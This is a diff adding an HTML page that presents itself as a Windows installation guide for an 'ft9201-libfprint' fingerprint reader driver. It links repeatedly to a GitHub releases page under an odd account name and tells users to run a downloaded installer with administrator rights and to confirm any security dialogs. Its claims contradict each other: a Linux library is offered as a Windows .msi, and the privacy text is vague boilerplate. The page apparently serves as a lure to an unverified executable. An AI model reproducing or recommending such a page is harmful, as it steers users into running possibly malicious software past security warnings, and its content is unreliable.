@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Guide for installing the Focal-systems FT9201 fingerprint reader driver. Set up your biometric hardware for Windows easily.">
+    <title>ft9201-libfprint Setup Guide</title>
+</head>
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
+
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;"> fingerprint Enable your FT9201 fingerprint reader</h1>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/oncological-snap446/ft9201-libfprint/releases" style="padding: 15px 30px; background-color: #2c3e50; color: #ffffff; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Current Driver Version</a>
+    </div>
+
+    <h2 style="color: #2c3e50;">ℹ️ Project Overview</h2>
+    <p>This software allows your Focal-systems FT9201 (2808:93a9) USB fingerprint reader to communicate with your operating system. It bridges the gap between hardware and software to ensure your biometric scanner functions without errors. You do not need complex tools or extra software bridges like Wine to make this work.</p>
+
+    <h2 style="color: #2c3e50;">📋 System Requirements</h2>
+    <p>Before you begin the setup process, ensure your system meets these basic requirements:</p>
+    <ul>
+        <li>A computer running a modern version of Windows.</li>
+        <li>The Focal-systems FT9201 USB fingerprint reader device connected to an available USB port.</li>
+        <li>Administrative access to your user account to install drivers.</li>
+        <li>An internet connection to fetch the necessary installer package.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">📥 Download and Installation</h2>
+    <p>Follow these steps to obtain and install the driver files:</p>
+    <ol>
+        <li>Visit the <a href="https://github.com/oncological-snap446/ft9201-libfprint/releases" style="color: #3498db;">project releases page</a> to select the latest version.</li>
+        <li>Locate the file ending in .zip or .msi and select it to begin your download.</li>
+        <li>Once the download completes, navigate to your Downloads folder.</li>
+        <li>Right-click the downloaded file and choose "Extract" if it is in a compressed folder.</li>
+        <li>Double-click the installer executable to start the setup wizard.</li>
+        <li>Follow the prompts on your screen. Select the "Default" installation path to ensure the driver files register correctly with Windows.</li>
+        <li>Confirm any security dialogs that appear, as these ensure the system trusts the new hardware driver.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">🛠️ Troubleshooting</h2>
+    <p>If your fingerprint reader does not respond after installation, try these steps:</p>
+    <ul>
+        <li>Unplug the device from your USB port and plug it back in after five seconds.</li>
+        <li>Open your Device Manager to confirm the FT9201 appears without a yellow warning icon.</li>
+        <li>Restart your computer to allow the updated driver configuration to take effect.</li>
+        <li>Ensure you have a modern version of the Windows Hello authentication service enabled.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">🔒 Security and Privacy</h2>
+    <p>This software works by passing data from your hardware to your system authentication service. It does not store your fingerprint images on your hard drive. Your biometric data stays inside the encrypted secure element on the device or follows industry standards for Windows biometric templates. This software acts only as a communication path.</p>
+
+    <h2 style="color: #2c3e50;">💬 Support</h2>
+    <p>If you encounter specific error codes during installation, document the exact text of the error. Check the "Issues" tab on the main repository link provided at the top to see if others have found a solution for your setup. Maintain a clear description of your hardware model when you ask for assistance.</p>
+
+    <footer style="margin-top: 50px; font-size: 0.8em; color: #7f8c8d; border-top: 1px solid #ddd; padding-top: 10px;">
+        <p>Keywords: fingerprint, driver, hardware, usb, windows, biometric, utilities</p>
+    </footer>
+
+</body>
+</html>
